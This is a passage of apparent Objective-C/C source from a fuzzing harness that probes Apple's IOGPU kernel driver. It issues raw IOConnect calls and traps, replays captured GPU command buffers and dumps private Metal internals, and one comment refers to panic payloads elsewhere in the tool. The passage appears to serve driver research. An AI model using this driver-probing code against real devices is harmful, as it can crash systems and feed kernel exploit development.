            *(uint32_t *)(_v + 0x4c) = 1; \
            _g6 = _v + 0x50; \
        } else { \
            memcpy(_v, agx_B4_image, 0x4000); \
            *(uint32_t *)(_v + 0x40) = 2; \
            *(uint32_t *)(_v + 0x44) = 1; \
            _g6 = _v + 0x48; \
        } \
        *(uint32_t *)(_g6 + 0x00) = ridA; \
        *(uint32_t *)(_g6 + 0x04) = ridB; \
        *(uint32_t *)(_g6 + 0x18) = (uint32_t)(BSZ >> 10); \
        *(uint32_t *)(_g6 + 0x1c) = (uint32_t)(BSZ >> 10); \
        *(uint16_t *)(_g6 + 0x30) = (uint16_t)(usage); \
        *(uint16_t *)(_g6 + 0x32) = (uint16_t)(usage); \
        *(uint16_t *)(_g6 + 0x3e) = 2; \
    } while (0)

    // FULL: faithful replay of the captured fillBuffer submit. Three resources
    // carry the exact captured contents at the exact captured GPUVAs (the
    // allocator is deterministic per fresh process: 0x1_00000000 / 0x1_00018000
    // / 0x1_00030000), command image is submitted UNPATCHED. Segment list is
    // capture-faithful plus one 6-pack group with all three rids. If the GPU
    // executes the fill, dest B turns 0x5A (fill pattern from the capture).
    int full_ok = 0;
    if (have_assets && ridC &&
        gpuvaA == 0x10000000000ULL && gpuvaB == 0x10000018000ULL &&
        gpuvaC == 0x10000030000ULL) {
        static const struct { int cmdt; uint16_t usage; const char *n; } fcombos[] = {
            { 1, 3, "FULL t1 u3" },     // entry {idCmd=2, idSeg=1} exactly like capture
            { 0, 3, "FULL t0 u3" },
            { 1, 6, "FULL t1 u6" },
        };
        for (unsigned fi = 0; fi < sizeof(fcombos)/sizeof(fcombos[0]); fi++) {
            uint8_t *vc = fcombos[fi].cmdt ? vaCmd : vaCmd0;
            uint32_t idc = fcombos[fi].cmdt ? idCmd : idCmd0;
            memcpy(vc, agx_A4_image, 0x4000);            // verbatim, no patching
            memcpy(vaSeg, agx_B4_image, 0x4000);         // verbatim KCL+SL+segment
            *(uint32_t *)(vaSeg + 0x40) = 3;             // numResources
            *(uint32_t *)(vaSeg + 0x44) = 1;             // numResourceGroups
            uint8_t *g6 = vaSeg + 0x48;
            memset(g6, 0, 0x40);
            *(uint32_t *)(g6 + 0x00) = ridA;
            *(uint32_t *)(g6 + 0x04) = ridB;
            *(uint32_t *)(g6 + 0x08) = ridC;
            *(uint32_t *)(g6 + 0x18) = (uint32_t)(BSZ >> 10);
            *(uint32_t *)(g6 + 0x1c) = (uint32_t)(BSZ >> 10);
            *(uint32_t *)(g6 + 0x20) = (uint32_t)(0x20000 >> 10);
            *(uint16_t *)(g6 + 0x30) = fcombos[fi].usage;
            *(uint16_t *)(g6 + 0x32) = fcombos[fi].usage;
            *(uint16_t *)(g6 + 0x34) = fcombos[fi].usage;
            *(uint16_t *)(g6 + 0x3e) = 3;
            memset(entry, 0, 0x1000);
            *(uint32_t *)(entry + 0x00) = idc;
            *(uint32_t *)(entry + 0x04) = idSeg;
            *(uint64_t *)(entry + 0x10) = (uint64_t)(uintptr_t)comp;         // capture form
            *(uint64_t *)(entry + 0x18) = (uint64_t)(uintptr_t)(comp + 0x30);
            *outw = 0xdeadbeef;
            memset(cpuB, 0, BSZ);
            memset(comp, 0, 0x1000);
            kern_return_t kt = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
            // post-submit bookkeeping observed in the Metal trace
            uint64_t s17[1] = { 1 };
            kern_return_t k17 = IOConnectCallScalarMethod(c, 17, s17, 1, NULL, NULL);
            uint64_t s15[1] = { 2 };
            kern_return_t k15a = IOConnectCallScalarMethod(c, 15, s15, 1, NULL, NULL);
            s15[0] = 1;
            kern_return_t k15b = IOConnectCallScalarMethod(c, 15, s15, 1, NULL, NULL);
            // poll up to 2s for the fill to land / completion to update
            long nz = 0, f5 = 0;
            for (int w = 0; w < 20; w++) {
                usleep(100000);
                nz = 0; f5 = 0;
                for (long i = 0; i < (long)BSZ; i += 0x40) {   // sampled scan
                    if (cpuB[i]) nz++;
                    if (cpuB[i] == 0x5A) f5++;
                }
                if (nz) break;
            }
            uint64_t *cq = (uint64_t *)comp;
            LOG("[mtlr] %s -> kr 0x%08x outw %08x post{17:%08x 15:%08x/%08x} | B(sampled): nonzero %ld, 0x5A %ld %s",
                fcombos[fi].n, kt, *outw, k17, k15a, k15b, nz, f5, nz ? "GPU WRITE OBSERVED!" : "(no write)");
            LOG("[mtlr] B[0..15] %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x",
                cpuB[0], cpuB[1], cpuB[2], cpuB[3], cpuB[4], cpuB[5], cpuB[6], cpuB[7],
                cpuB[8], cpuB[9], cpuB[10], cpuB[11], cpuB[12], cpuB[13], cpuB[14], cpuB[15]);
            LOG("[mtlr] comp: %016llx %016llx %016llx %016llx | comp+30: %016llx %016llx",
                cq[0], cq[1], cq[2], cq[3], cq[6], cq[7]);
            if (nz) { full_ok = 1; LOG("[mtlr] *** FULL replay succeeded"); break; }
        }
    } else {
        LOG("[mtlr] FULL replay skipped (assets %d ridC %u gpuva match %d/%d/%d)",
            have_assets, ridC, gpuvaA == 0x10000000000ULL, gpuvaB == 0x10000018000ULL,
            gpuvaC == 0x10000030000ULL);
    }

    // Combo ladder: bridge from the known-accepted v80 setup (outw=0) to the
    // spec-B hand-built structures. Fields: cmd shmem (0=legacy type0,
    // 1=typed type1), seglist style, aux ptrs in entry, ridB @entry+0x20,
    // residency in nop, usage. Skipped entirely when FULL already wrote.
    static const struct {
        int cmdshmem, segstyle, aux, ent20, resid; uint16_t usage; const char *n;
    } combos[] = {
        { 0, 1, 1, 1, 0, 3,      "S1 capseg+6pk u3" },       // closest to v80
        { 0, 1, 1, 1, 1, 3,      "S2 S1+residnop" },
        { 1, 1, 1, 1, 0, 3,      "S3 S1 cmdtype1" },
        { 0, 1, 1, 1, 0, 0xffff, "S4 S1 uFFFF" },
        { 0, 1, 0, 0, 0, 3,      "S5 S1 noaux no20" },
        { 0, 0, 1, 1, 0, 3,      "S6 handseg u3" },
        { 1, 0, 0, 0, 0, 3,      "S7 handseg cmdtype1 bare" },
        { 1, 0, 0, 0, 1, 0xffff, "S8 handseg t1 resid uFFFF" },
    };
    for (unsigned ci = 0; !full_ok && ci < sizeof(combos)/sizeof(combos[0]); ci++) {
        uint8_t *vc = combos[ci].cmdshmem ? vaCmd : vaCmd0;
        uint32_t idc = combos[ci].cmdshmem ? idCmd : idCmd0;
        MTLR_FILL_CMD(vc, combos[ci].resid);
        MTLR_FILL_SEG(vaSeg, combos[ci].segstyle, combos[ci].usage);
        memset(entry, 0, 0x1000);
        *(uint32_t *)(entry + 0x00) = idc;          // kernelCmdShmemID
        *(uint32_t *)(entry + 0x04) = idSeg;        // segmentListShmemID
        if (combos[ci].aux) {
            *(uint64_t *)(entry + 0x10) = (uint64_t)(uintptr_t)aux1;
            *(uint64_t *)(entry + 0x18) = (uint64_t)(uintptr_t)aux2;
        }
        if (combos[ci].ent20)
            *(uint32_t *)(entry + 0x20) = ridB;     // prepare/residency reference
        *outw = 0xdeadbeef;
        memset(cpuB, 0, BSZ);
        kern_return_t kt = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
        usleep(300000);
        long nz = 0, pat = 0;
        for (long i = 0; i < (long)BSZ; i++) {
            if (cpuB[i]) nz++;
            if (cpuB[i] == 0x41) pat++;
        }
        LOG("[mtlr] combo %s -> kr 0x%08x outw %08x | B: nonzero %ld, pattern(0x41) %ld / 0x%llx %s",
            combos[ci].n, kt, *outw, nz, pat, BSZ, nz ? "GPU WRITE OBSERVED!" : "(no write)");
        LOG("[mtlr] B[0..15] %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x",
            cpuB[0], cpuB[1], cpuB[2], cpuB[3], cpuB[4], cpuB[5], cpuB[6], cpuB[7],
            cpuB[8], cpuB[9], cpuB[10], cpuB[11], cpuB[12], cpuB[13], cpuB[14], cpuB[15]);
        if (nz) { LOG("[mtlr] *** success candidate in combo %s", combos[ci].n); break; }
    }
    LOG("[mtlr] done (alive)");
}


// V84: notification-queue diagnostics (IOGPU.framework reverse, macOS 27).
extern mach_port_t mach_reply_port(void);   // present in libsystem, hidden in iOS SDK headers
// Matrix {nq entrySize 0x10/0x28} x {trap entrySize 0x30/0x40} on the
// capture-faithful FULL config. Polls the nq data queue for 0x28-byte
// completion records {u64, u64 startTime, u64 endTime, u32 status @+0x18}.
static NSData *g_mtlr_a0, *g_mtlr_a1, *g_mtlr_a2;
static int mtlr_assets(void) {
    static int tried = 0;
    if (tried) return g_mtlr_a0 != nil;
    tried = 1;
    NSBundle *mb = [NSBundle mainBundle];
    NSString *p0 = [mb pathForResource:@"res0_metacache" ofType:@"bin"];
    NSString *p1 = [mb pathForResource:@"res1_dest" ofType:@"bin"];
    NSString *p2 = [mb pathForResource:@"res2_pool" ofType:@"bin"];
    g_mtlr_a0 = p0 ? [NSData dataWithContentsOfFile:p0] : nil;
    g_mtlr_a1 = p1 ? [NSData dataWithContentsOfFile:p1] : nil;
    g_mtlr_a2 = p2 ? [NSData dataWithContentsOfFile:p2] : nil;
    return g_mtlr_a0.length == 0x10000 && g_mtlr_a1.length == 0x10000 && g_mtlr_a2.length == 0x20000;
}

// V85: continuous verbatim-replay loop for the on-screen glitch correlation
// test. No panic payloads, no scaler phases — AGX replay submits only.
static uint64_t mtlr_hash(const uint8_t *p, long n) {
    uint64_t h = 1469598103934665603ULL;
    for (long i = 0; i < n; i++) { h ^= p[i]; h *= 1099511628211ULL; }
    return h;
}
static void mtlr_loop(int secs) {
    LOG("[mtlr-loop] v85: verbatim replay loop, %d s", secs);
    if (!mtlr_assets()) { LOG("[mtlr-loop] assets missing, abort"); return; }
    const uint64_t BSZ = 0x10000;
    io_connect_t c = open_service("IOGPU", 1);
    if (!c) return;
    uint8_t *in = must_map(0x2000);
    uint8_t *out = must_map(0x1000);
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    uint64_t a14[2] = { 0x100, 0x10 };
    size_t osz = 0x10;
    kern_return_t kr = IOConnectCallMethod(c, 14, a14, 2, NULL, 0, osc, &nosc, out, &osz);
    uint64_t nqVA = *(uint64_t *)out;
    uint32_t nqid = *(uint32_t *)(out + 8);
    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
    const char *pn = getprogname();
    strncpy((char *)in, pn, 0x1f);
    *(uint32_t *)(in + 0x400) = 2;
    osz = 0x10; nosc = 0;
    kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
    uint64_t qid = *(uint64_t *)out;
    uint64_t a24[2] = { qid, nqid };
    kern_return_t kb = IOConnectCallScalarMethod(c, 24, a24, 2, NULL, NULL);
    kern_return_t kn = IOConnectSetNotificationPort(c, 0, mach_reply_port(), nqid);
    LOG("[mtlr-loop] setup: qid %llu nqid %u nqVA %llx bind 0x%08x notif 0x%08x",
        qid, nqid, nqVA, kb, kn);
    if (!qid || kb) return;

    uint64_t gpuvaA = 0, gpuvaB = 0, gpuvaC = 0;
    uint8_t *cpuA = NULL, *cpuB = NULL, *cpuC = NULL;
    uint32_t ridA = gpu_resource2(c, BSZ, &gpuvaA, &cpuA);
    uint32_t ridB = gpu_resource2(c, BSZ, &gpuvaB, &cpuB);
    uint32_t ridC = gpu_resource2(c, 0x20000, &gpuvaC, &cpuC);
    if (!ridA || !ridB || !ridC || !cpuA || !cpuB || !cpuC) {
        LOG("[mtlr-loop] resources failed %u %u %u", ridA, ridB, ridC); return;
    }
    memcpy(cpuA, [g_mtlr_a0 bytes], BSZ);
    memcpy(cpuB, [g_mtlr_a1 bytes], BSZ);
    memcpy(cpuC, [g_mtlr_a2 bytes], 0x20000);
    LOG("[mtlr-loop] GPUVA A %llx B %llx C %llx (match %d/%d/%d)",
        gpuvaA, gpuvaB, gpuvaC,
        gpuvaA == 0x10000000000ULL, gpuvaB == 0x10000018000ULL, gpuvaC == 0x10000030000ULL);

    uint8_t *vaSeg, *vaCmd;
    uint32_t idSeg = gpu_shmem_t(c, 0x4000, 0, &vaSeg);
    uint32_t idCmd = gpu_shmem_t(c, 0x4000, 1, &vaCmd);
    if (!idSeg || !idCmd) return;
    // capture-faithful FULL config (the one that yields kr 0 / outU32 0 / {0,5})
    memcpy(vaCmd, agx_A4_image, 0x4000);
    if (gpuvaB != 0x10000018000ULL) {
        for (long o = 0; o < 0x1000 - 8; o += 4) {
            uint64_t q = *(uint64_t *)(vaCmd + o);
            if ((q >> 32) == 0x100) {
                if ((q & 0xffffffff) == 0x18000) *(uint64_t *)(vaCmd + o) = gpuvaB;
                else *(uint64_t *)(vaCmd + o) = gpuvaA + (q & 0x3fff);
            }
        }
    }
    memcpy(vaSeg, agx_B4_image, 0x4000);
    *(uint32_t *)(vaSeg + 0x40) = 3;
    *(uint32_t *)(vaSeg + 0x44) = 1;
    uint8_t *g6 = vaSeg + 0x48;
    memset(g6, 0, 0x40);
    *(uint32_t *)(g6 + 0x00) = ridA;
    *(uint32_t *)(g6 + 0x04) = ridB;
    *(uint32_t *)(g6 + 0x08) = ridC;
    *(uint32_t *)(g6 + 0x18) = (uint32_t)(BSZ >> 10);
    *(uint32_t *)(g6 + 0x1c) = (uint32_t)(BSZ >> 10);
    *(uint32_t *)(g6 + 0x20) = (uint32_t)(0x20000 >> 10);
    *(uint16_t *)(g6 + 0x30) = 3;
    *(uint16_t *)(g6 + 0x32) = 3;
    *(uint16_t *)(g6 + 0x34) = 3;
    *(uint16_t *)(g6 + 0x3e) = 3;
    uint8_t *entry = must_map(0x1000);
    uint32_t *outw = (uint32_t *)must_map(0x100);
    uint8_t *comp = must_map(0x1000);
    memset(comp, 0, 0x1000);
    memset(entry, 0, 0x1000);
    *(uint32_t *)(entry + 0x00) = idCmd;
    *(uint32_t *)(entry + 0x04) = idSeg;
    *(uint64_t *)(entry + 0x10) = (uint64_t)(uintptr_t)comp;
    *(uint64_t *)(entry + 0x18) = (uint64_t)(uintptr_t)(comp + 0x30);
    volatile uint8_t *nq = (volatile uint8_t *)(uintptr_t)nqVA;

    uint64_t hA0 = mtlr_hash(cpuA, BSZ), hB0 = mtlr_hash(cpuB, BSZ), hC0 = mtlr_hash(cpuC, 0x20000);
    LOG("[mtlr-loop] pre : hash A %016llx B %016llx C %016llx", hA0, hB0, hC0);
    LOG("[mtlr-loop] looping %d s — WATCH THE SCREEN", secs);

    struct timespec t0, t1, tlast;
    clock_gettime(CLOCK_MONOTONIC, &t0);
    tlast = t0;
    long nsub = 0;
    kern_return_t kt = 0;
    for (;;) {
        clock_gettime(CLOCK_MONOTONIC, &t1);
        double el = (double)(t1.tv_sec - t0.tv_sec) + 1e-9 * (double)(t1.tv_nsec - t0.tv_nsec);
        if (el >= secs) break;
        *outw = 0xdeadbeef;
        kt = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
        nsub++;
        usleep(1000);
        double sincel = (double)(t1.tv_sec - tlast.tv_sec) + 1e-9 * (double)(t1.tv_nsec - tlast.tv_nsec);
        if (sincel >= 5.0) {
            tlast = t1;
            uint32_t wr = nqVA ? *(volatile uint32_t *)(nq + 0x08) : 0;
            uint32_t s1 = 0, s2 = 0;
            if (nqVA && wr >= 0x2c) {
                s2 = *(volatile uint32_t *)(nq + 0x10 + wr - 0x2c + 0x18);
                if (wr >= 0x58) s1 = *(volatile uint32_t *)(nq + 0x10 + wr - 0x58 + 0x18);
            }
            LOG("[mtlr-loop] t=%.0fs submits %ld kr 0x%08x outw %08x wrIdx %x last-status {%u, %u}",
                el, nsub, kt, *outw, wr, s1, s2);
        }
    }
    uint64_t hA1 = mtlr_hash(cpuA, BSZ), hB1 = mtlr_hash(cpuB, BSZ), hC1 = mtlr_hash(cpuC, 0x20000);
    LOG("[mtlr-loop] post: hash A %016llx (%s) B %016llx (%s) C %016llx (%s)",
        hA1, hA1 == hA0 ? "same" : "CHANGED",
        hB1, hB1 == hB0 ? "same" : "CHANGED",
        hC1, hC1 == hC0 ? "same" : "CHANGED");
    long nz = 0, f5 = 0;
    for (long i = 0; i < (long)BSZ; i++) { if (cpuB[i]) nz++; if (cpuB[i] == 0x5A) f5++; }
    LOG("[mtlr-loop] done: %ld submits in %d s, B nonzero %ld 5A %ld, last kr 0x%08x",
        nsub, secs, nz, f5, kt);
    IOServiceClose(c);
}

static void p_mtlreplay2(void) {
    LOG("[mtlr2] v84 matrix: {nq entrySize} x {trap entrySize}, capture-faithful");
    const char *loopsec = getenv("FUZZ_MTLR_LOOP");
    if (loopsec) { mtlr_loop(atoi(loopsec)); return; }
    if (!mtlr_assets()) { LOG("[mtlr2] assets missing, abort"); return; }
    static const uint64_t nqSizes[]   = { 0x10, 0x28 };
    static const uint64_t trapSizes[] = { 0x30, 0x40 };
    const uint64_t BSZ = 0x10000;
    for (unsigned cell = 0; cell < sizeof(nqSizes)/sizeof(nqSizes[0]); cell++) {
        uint64_t nqES = nqSizes[cell];
        io_connect_t c = open_service("IOGPU", 1);
        if (!c) { LOG("[mtlr2] nq%llx: open fail", nqES); continue; }
        uint8_t *in = must_map(0x2000);
        uint8_t *out = must_map(0x1000);
        uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
        uint64_t a14[2] = { 0x100, nqES };
        size_t osz = 0x10;
        kern_return_t kr = IOConnectCallMethod(c, 14, a14, 2, NULL, 0, osc, &nosc, out, &osz);
        uint64_t nqVA = *(uint64_t *)out;
        uint32_t nqid = *(uint32_t *)(out + 8);
        LOG("[mtlr2] sel14 {0x100, 0x%llx} -> kr 0x%08x nqVA %llx nqid %u osz 0x%zx",
            nqES, kr, nqVA, nqid, osz);
        // queue create blob + procName @+0x000, priority=2 @+0x400
        memset(in, 0, 0x2000); memset(out, 0, 0x1000);
        const char *pn = getprogname();
        strncpy((char *)in, pn, 0x1f);
        *(uint32_t *)(in + 0x400) = 2;
        osz = 0x10; nosc = 0;
        kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
        uint64_t qid = *(uint64_t *)out;
        uint64_t a24[2] = { qid, nqid };
        kern_return_t kb = IOConnectCallScalarMethod(c, 24, a24, 2, NULL, NULL);
        kern_return_t kn = IOConnectSetNotificationPort(c, 0, mach_reply_port(), nqid);
        LOG("[mtlr2] queue: kr 0x%08x qid %llu bind 0x%08x notifport 0x%08x proc '%s'",
            kr, qid, kb, kn, pn);
        if (!qid || kb) { IOServiceClose(c); continue; }

        uint64_t gpuvaA = 0, gpuvaB = 0, gpuvaC = 0;
        uint8_t *cpuA = NULL, *cpuB = NULL, *cpuC = NULL;
        uint32_t ridA = gpu_resource2(c, BSZ, &gpuvaA, &cpuA);
        uint32_t ridB = gpu_resource2(c, BSZ, &gpuvaB, &cpuB);
        uint32_t ridC = gpu_resource2(c, 0x20000, &gpuvaC, &cpuC);
        if (!ridA || !ridB || !ridC || !cpuA || !cpuB || !cpuC) {
            LOG("[mtlr2] resources failed %u %u %u", ridA, ridB, ridC);
            IOServiceClose(c); continue;
        }
        memcpy(cpuA, [g_mtlr_a0 bytes], BSZ);
        memcpy(cpuB, [g_mtlr_a1 bytes], BSZ);
        memcpy(cpuC, [g_mtlr_a2 bytes], 0x20000);
        LOG("[mtlr2] GPUVA A %llx B %llx C %llx (capture match %d/%d/%d)",
            gpuvaA, gpuvaB, gpuvaC,
            gpuvaA == 0x10000000000ULL, gpuvaB == 0x10000018000ULL, gpuvaC == 0x10000030000ULL);

        uint8_t *vaSeg, *vaCmd;
        uint32_t idSeg = gpu_shmem_t(c, 0x4000, 0, &vaSeg);
        uint32_t idCmd = gpu_shmem_t(c, 0x4000, 1, &vaCmd);
        if (!idSeg || !idCmd) { IOServiceClose(c); continue; }
        // kernel-written shmem headers, before any writes
        uint64_t *sq = (uint64_t *)vaSeg, *hq = (uint64_t *)vaCmd;
        LOG("[mtlr2] seg hdr: %016llx %016llx %016llx %016llx", sq[0], sq[1], sq[2], sq[3]);
        LOG("[mtlr2]          %016llx %016llx %016llx %016llx", sq[4], sq[5], sq[6], sq[7]);
        LOG("[mtlr2] cmd hdr: %016llx %016llx %016llx %016llx", hq[0], hq[1], hq[2], hq[3]);
        LOG("[mtlr2]          %016llx %016llx %016llx %016llx", hq[4], hq[5], hq[6], hq[7]);
        volatile uint8_t *nq = (volatile uint8_t *)(uintptr_t)nqVA;
        if (nqVA) {
            LOG("[mtlr2] nq base: %016llx %016llx %016llx %016llx",
                *(volatile uint64_t *)(nq + 0x00), *(volatile uint64_t *)(nq + 0x08),
                *(volatile uint64_t *)(nq + 0x10), *(volatile uint64_t *)(nq + 0x18));
        }
        uint8_t *entry = must_map(0x1000);
        uint32_t *outw = (uint32_t *)must_map(0x100);
        uint8_t *comp = must_map(0x1000);
        size_t nqScan = (size_t)(0x100 * nqES);
        if (nqScan > 0x4000) nqScan = 0x4000;

        for (unsigned t = 0; t < sizeof(trapSizes)/sizeof(trapSizes[0]); t++) {
            uint64_t tSz = trapSizes[t];
            memcpy(vaCmd, agx_A4_image, 0x4000);         // verbatim if GPUVAs match
            if (gpuvaB != 0x10000018000ULL) {
                for (long o = 0; o < 0x1000 - 8; o += 4) {
                    uint64_t q = *(uint64_t *)(vaCmd + o);
                    if ((q >> 32) == 0x100) {
                        if ((q & 0xffffffff) == 0x18000) *(uint64_t *)(vaCmd + o) = gpuvaB;
                        else *(uint64_t *)(vaCmd + o) = gpuvaA + (q & 0x3fff);
                    }
                }
            }
            memcpy(vaSeg, agx_B4_image, 0x4000);
            *(uint32_t *)(vaSeg + 0x40) = 3;             // numResources
            *(uint32_t *)(vaSeg + 0x44) = 1;             // numResourceGroups
            uint8_t *g6 = vaSeg + 0x48;
            memset(g6, 0, 0x40);
            *(uint32_t *)(g6 + 0x00) = ridA;
            *(uint32_t *)(g6 + 0x04) = ridB;
            *(uint32_t *)(g6 + 0x08) = ridC;
            *(uint32_t *)(g6 + 0x18) = (uint32_t)(BSZ >> 10);
            *(uint32_t *)(g6 + 0x1c) = (uint32_t)(BSZ >> 10);
            *(uint32_t *)(g6 + 0x20) = (uint32_t)(0x20000 >> 10);
            *(uint16_t *)(g6 + 0x30) = 3;
            *(uint16_t *)(g6 + 0x32) = 3;
            *(uint16_t *)(g6 + 0x34) = 3;
            *(uint16_t *)(g6 + 0x3e) = 3;
            memset(entry, 0, 0x1000);
            *(uint32_t *)(entry + 0x00) = idCmd;
            *(uint32_t *)(entry + 0x04) = idSeg;
            *(uint64_t *)(entry + 0x10) = (uint64_t)(uintptr_t)comp;
            *(uint64_t *)(entry + 0x18) = (uint64_t)(uintptr_t)(comp + 0x30);
            *outw = 0xdeadbeef;
            memset(cpuB, 0, BSZ);
            memset(comp, 0, 0x1000);
            kern_return_t kt = ioconnect_trap4(c, 0, qid, tSz, (uintptr_t)entry, (uintptr_t)outw);
            // poll ~5ms: completion records in nq data queue + write check on B
            long recOff = -1; uint32_t recStatus = 0;
            uint64_t r0 = 0, r1 = 0, r2 = 0, r3 = 0;
            long nz = 0, f5 = 0;
            for (int w = 0; w < 10; w++) {
                usleep(500);
                if (nqVA && recOff < 0) {
                    for (size_t o = 0; o + 8 <= nqScan; o += (size_t)nqES) {
                        uint64_t q0 = *(volatile uint64_t *)(nq + o);
                        if (q0) {
                            recOff = (long)o;
                            r0 = q0;
                            r1 = *(volatile uint64_t *)(nq + o + 0x08);
                            r2 = *(volatile uint64_t *)(nq + o + 0x10);
                            if (o + 0x1c <= nqScan) {
                                r3 = *(volatile uint64_t *)(nq + o + 0x18);
                                recStatus = *(volatile uint32_t *)(nq + o + 0x18);
                            }
                            break;
                        }
                    }
                }
                if (!nz && cpuB[0]) break;
            }
            for (long i = 0; i < (long)BSZ; i += 0x40) {
                if (cpuB[i]) nz++;
                if (cpuB[i] == 0x5A) f5++;
            }
            LOG("[mtlr2] nq%02llx/trap%02llx -> kr 0x%08x outU32 %08x | rec off %ld status 0x%08x | B(sampled) nz %ld 5A %ld %s",
                nqES, tSz, kt, *outw, recOff, recStatus, nz, f5, nz ? "GPU WRITE OBSERVED!" : "");
            if (recOff >= 0)
                LOG("[mtlr2]   rec@%lx: %016llx %016llx %016llx %016llx", recOff, r0, r1, r2, r3);
            if (nqVA) {
                // full dump of queue head + first records (stride observed: 0x2c)
                for (int off = 0; off < 0x100; off += 0x10)
                    LOG("[mtlr2]   nq+%03x: %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x",
                        off, nq[off+0], nq[off+1], nq[off+2], nq[off+3], nq[off+4], nq[off+5],
                        nq[off+6], nq[off+7], nq[off+8], nq[off+9], nq[off+10], nq[off+11],
                        nq[off+12], nq[off+13], nq[off+14], nq[off+15]);
            }
            uint64_t *cq = (uint64_t *)comp;
            LOG("[mtlr2]   comp: %016llx %016llx | comp+30: %016llx %016llx | outw[1] %08x",
                cq[0], cq[1], cq[6], cq[7], outw[1]);
        }
        IOServiceClose(c);
    }
    LOG("[mtlr2] done (alive)");
}


// V86: Metal self-reference discrimination. Build a REAL Metal blit copy
// command buffer in-process, dump its commandBufferStorage shmems (the exact
// bytes the kernel accepts at execution stage), commit+verify (GPU sanity),
// then raw-replay those bytes through OUR sel6 queue and read the completion
// status. status 0/0 -> our hand-crafted bytes are the problem; status 5
// again -> the queue/context is the problem.
#import <Metal/Metal.h>

static void mtl_hexdump(const char *tag, long base, const uint8_t *p, long n) {
    for (long o = 0; o < n; o += 0x10)
        LOG("[mtls] %s+%03lx: %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x",
            tag, base + o, p[o], p[o+1], p[o+2], p[o+3], p[o+4], p[o+5], p[o+6], p[o+7],
            p[o+8], p[o+9], p[o+10], p[o+11], p[o+12], p[o+13], p[o+14], p[o+15]);
}

// find an object-typed ivar whose name contains substr; logs all ivars when logall
static void *find_ivar_obj(id obj, const char *substr, int logall, const char *tag) {
    Class cls = object_getClass(obj);
    while (cls) {
        unsigned ni = 0;
        Ivar *ivs = class_copyIvarList(cls, &ni);
        void *hit = NULL;
        for (unsigned i = 0; i < ni; i++) {
            const char *nm = ivar_getName(ivs[i]);
            if (logall) LOG("[mtls]   %s ivar %s @%td", tag, nm, ivar_getOffset(ivs[i]));
            if (!hit && nm && strstr(nm, substr))
                hit = *(void **)((uint8_t *)(__bridge void *)obj + ivar_getOffset(ivs[i]));
        }
        free(ivs);
        if (hit) return hit;
        cls = class_getSuperclass(cls);
    }
    return NULL;
}
static uint32_t find_ivar_u32(id obj, const char *substr) {
    Class cls = object_getClass(obj);
    while (cls) {
        unsigned ni = 0;
        Ivar *ivs = class_copyIvarList(cls, &ni);
        uint32_t hit = 0; int found = 0;
        for (unsigned i = 0; i < ni; i++) {
            const char *nm = ivar_getName(ivs[i]);
            if (nm && strstr(nm, substr)) {
                hit = *(uint32_t *)((uint8_t *)(__bridge void *)obj + ivar_getOffset(ivs[i]));
                found = 1; break;
            }
        }
        free(ivs);
        if (found) return hit;
        cls = class_getSuperclass(cls);
    }
    return 0;
}

static void p_mtlself(void) {
    LOG("[mtls] v86: Metal self-reference discrimination");
    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    if (!dev) { LOG("[mtls] no MTLDevice"); return; }
    LOG("[mtls] device: %s", [[dev name] UTF8String]);
    id<MTLCommandQueue> mq = [dev newCommandQueue];
    id<MTLBuffer> bufA = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
    id<MTLBuffer> bufB = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
    if (!mq || !bufA || !bufB) { LOG("[mtls] queue/buffers failed"); return; }
    memset([bufA contents], 0x41, 0x10000);
    memset([bufB contents], 0, 0x10000);
    LOG("[mtls] queue class %s", class_getName(object_getClass(mq)));
    // dump queue internals (looking for io_connect_t + qid for a Metal-queue submit test)
    {
        Class qc = object_getClass(mq);
        while (qc) {
            unsigned ni = 0;
            Ivar *ivs = class_copyIvarList(qc, &ni);
            for (unsigned i = 0; i < ni; i++) {
                const char *nm = ivar_getName(ivs[i]);
                ptrdiff_t off = ivar_getOffset(ivs[i]);
                uint64_t v = *(uint64_t *)((uint8_t *)(__bridge void *)mq + off);
                LOG("[mtls]   mq ivar %s @%td = 0x%llx", nm ? nm : "?", off, v);
            }
            free(ivs);
            qc = class_getSuperclass(qc);
        }
    }
    // dump the IOGPUMetalCommandQueue object (find io_connect + qid)
    {
        uint8_t *cqo = *(uint8_t **)((uint8_t *)(__bridge void *)mq + 384);
        if (cqo) {
            id cqid = (__bridge id)(void *)cqo;
            LOG("[mtls] cqobj class %s", class_getName(object_getClass(cqid)));
            Class qc = object_getClass(cqid);
            while (qc) {
                unsigned ni = 0;
                Ivar *ivs = class_copyIvarList(qc, &ni);
                for (unsigned i = 0; i < ni; i++) {
                    const char *nm = ivar_getName(ivs[i]);
                    ptrdiff_t off = ivar_getOffset(ivs[i]);
                    uint64_t v = *(uint64_t *)(cqo + off);
                    LOG("[mtls]   cq ivar %s @%td = 0x%llx", nm ? nm : "?", off, v);
                }
                free(ivs);
                qc = class_getSuperclass(qc);
            }
        }
    }
    id<MTLCommandBuffer> cb = [mq commandBuffer];
    id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
    [enc copyFromBuffer:bufA sourceOffset:0 toBuffer:bufB destinationOffset:0 size:0x10000];
    [enc endEncoding];
    LOG("[mtls] cb class %s", class_getName(object_getClass(cb)));

    // --- introspect commandBufferStorage
    void *storage = find_ivar_obj(cb, "torage", 1, "cb");
    LOG("[mtls] storage %p", storage);
    if (!storage) { LOG("[mtls] no storage ivar, abort"); return; }
    uint64_t kva = *(uint64_t *)((uint8_t *)storage + 0x28);   // kernel cmd shmem VA
